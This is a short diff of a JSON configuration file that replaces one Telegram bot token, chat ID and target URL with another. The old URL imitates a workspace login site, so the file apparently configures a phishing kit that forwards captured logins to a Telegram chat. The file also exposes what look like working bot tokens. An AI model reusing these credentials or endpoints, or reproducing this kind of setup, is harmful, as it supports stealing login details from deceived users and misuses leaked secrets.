@@ -1,8 +1,8 @@
 {
     "afk_mode": false,
     "afk_interval": 5000,
-    "telegram_token": "7804904772:AAHLkUSXhXwoGD6wFAYyG5slM5emR2uSwVw",
-    "telegram_chat_id": "-1001880409423",
-    "website_url": "https://auth-workspacelogin.com/",
+    "telegram_token": "8561153432:AAF3PMq2FDGnhBzYwM8CiWJZDU6Z2nXLvz4",
+    "telegram_chat_id": "1991363926",
+    "website_url": "https://tk-ap-1.onrender.com/",
     "telegram_buttons": true
 }
